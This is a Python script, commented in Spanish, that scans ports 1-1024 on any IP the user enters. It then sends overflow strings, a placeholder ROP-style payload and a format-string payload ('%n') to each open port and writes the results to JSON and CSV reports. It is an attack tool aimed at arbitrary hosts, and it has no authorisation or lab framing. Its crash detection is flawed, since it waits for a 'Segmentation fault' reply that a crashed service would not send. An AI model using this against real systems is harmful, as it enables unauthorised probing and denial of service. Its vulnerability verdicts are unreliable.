import socket
import threading
import time
import random
import struct
import logging
import platform
import sys
import traceback
import json
import csv
import concurrent.futures

# Configuración de logging para registrar información detallada
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Funciones básicas del sistema
def get_os_info():
    """Obtiene información del sistema operativo."""
    os_name = platform.system()
    os_version = platform.release()
    return f"{os_name} {os_version}"

def get_python_version():
    """Obtiene la versión de Python."""
    return sys.version

def export_to_json(data, filename="report.json"):
    """Exporta datos a un archivo JSON."""
    try:
        with open(filename, "w") as f:
            json.dump(data, f, indent=4)
        logging.info(f"Reporte exportado a {filename}.")
    except Exception as e:
        logging.error(f"Error al exportar a JSON: {e}")

def export_to_csv(data, filename="report.csv"):
    """Exporta datos a un archivo CSV."""
    try:
        with open(filename, "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["Puerto", "Longitud Overflow", "Análisis"])
            for port, details in data.items():
                writer.writerow([port, details.get("length", "N/A"), details.get("analysis", "N/A")])
        logging.info(f"Reporte exportado a {filename}.")
    except Exception as e:
        logging.error(f"Error al exportar a CSV: {e}")

# Funciones avanzadas de escaneo y análisis
def check_buffer_overflow(target_ip, target_port, max_length=15000):
    """Verifica la vulnerabilidad de buffer overflow con análisis detallado."""
    logging.info(f"Comprobando buffer overflow en {target_ip}:{target_port}...")
    buffer = b"A" * max_length
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((target_ip, target_port))
            s.sendall(buffer)
            time.sleep(2)
            try:
                data = s.recv(8192)
                if b"Segmentation fault" in data or b"crash" in data.lower():
                    logging.warning("Posible buffer overflow detectado con crash.")
                    return "Crash"
                elif len(data) > 0:
                    logging.info("Posible buffer overflow detectado con respuesta.")
                    return "Respuesta"
                else:
                    return "Sin respuesta"
            except socket.timeout:
                return "Sin respuesta"
    except Exception as e:
        logging.error(f"Error al conectar o enviar datos: {e}")
        return "Error"

def fuzz_buffer_overflow(target_ip, target_port, max_length=15000):
    """Realiza fuzzing para encontrar la longitud exacta del buffer overflow."""
    logging.info(f"Realizando fuzzing en {target_ip}:{target_port}...")
    for length in range(100, max_length, 100):
        buffer = b"A" * length
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((target_ip, target_port))
                s.sendall(buffer)
                time.sleep(1)
                data = s.recv(8192)
                if b"Segmentation fault" in data or b"crash" in data.lower():
                    logging.warning(f"Buffer overflow encontrado con longitud: {length}")
                    return length
        except (socket.timeout, socket.error):
            pass
    return None

def analyze_buffer_overflow(target_ip, target_port, length):
    """Analiza el buffer overflow para determinar el tipo de ataque."""
    if length is None:
        return "No se encontró buffer overflow."
    logging.info(f"Analizando buffer overflow en {target_ip}:{target_port} con longitud {length}...")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((target_ip, target_port))
            # Simulación de desbordamiento de pila con gadgets ROP
            rop_payload = b"A" * length + struct.pack("<I", 0x12345678) + b"\x90" * 16 + b"\xcc"
            s.send(rop_payload)
            time.sleep(2)
            data = s.recv(8192)
            if b"crash" in data.lower():
                logging.warning("Desbordamiento de pila con gadgets ROP detectado.")
                return "Desbordamiento de pila con gadgets ROP posible."
            # Simulación de desbordamiento de formato de cadena
            format_payload = b"A" * length + b"%x%x%x%n"
            s.send(format_payload)
            time.sleep(2)
            data = s.recv(8192)
            if b"crash" in data.lower():
                logging.warning("Desbordamiento de formato de cadena posible.")
                return "Desbordamiento de formato de cadena posible."
            return "Análisis sin resultados concluyentes."
    except Exception as e:
        logging.error(f"Error durante el análisis: {e}")
        return "Error durante el análisis."

def generate_report(target_ip, results):
    """Genera un informe detallado."""
    print("\n=== INFORME FINAL ===")
    print(f"Objetivo: {target_ip}")
    for port, details in results.items():
        print(f"\nPuerto {port}:")
        print(f"  Longitud Overflow: {details.get('length', 'N/A')}")
        print(f"  Análisis: {details.get('analysis', 'N/A')}")

# Escaneo y manejo concurrente
def scan_ports(target_ip, port_range):
    """Escanea puertos abiertos y analiza sus vulnerabilidades."""
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(scan_port, target_ip, port): port for port in port_range}
        for future in concurrent.futures.as_completed(futures):
            if future.result():
                open_ports.append(futures[future])
    return open_ports

def scan_port(target_ip, port):
    """Verifica si un puerto está abierto."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.5)
            if s.connect_ex((target_ip, port)) == 0:
                logging.info(f"Puerto abierto detectado: {port}")
                return port
    except Exception as e:
        logging.error(f"Error en el escaneo del puerto {port}: {e}")
    return None

def scan_buffer_overflow(target_ip, open_ports):
    """Realiza análisis de buffer overflow en los puertos abiertos."""
    results = {}
    for port in open_ports:
        length = fuzz_buffer_overflow(target_ip, port)
        analysis = analyze_buffer_overflow(target_ip, port, length)
        results[port] = {"length": length, "analysis": analysis}
    return results

def main():
    """Función principal."""
    print(f"Sistema operativo: {get_os_info()}")
    print(f"Versión de Python: {get_python_version()}")
    target_ip = input("Introduce la IP de destino: ")
    port_range = range(1, 1025)

    print("\n🔍 Escaneando puertos abiertos...")
    open_ports = scan_ports(target_ip, port_range)

    if open_ports:
        print(f"Puertos abiertos encontrados: {', '.join(map(str, open_ports))}")
        results = scan_buffer_overflow(target_ip, open_ports)
        generate_report(target_ip, results)
        export_to_json(results)
        export_to_csv(results)
    else:
        print("No se encontraron puertos abiertos.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nEjecución interrumpida por el usuario.")
    except Exception as e:
        print(f"Error inesperado: {e}")
        traceback.print_exc()
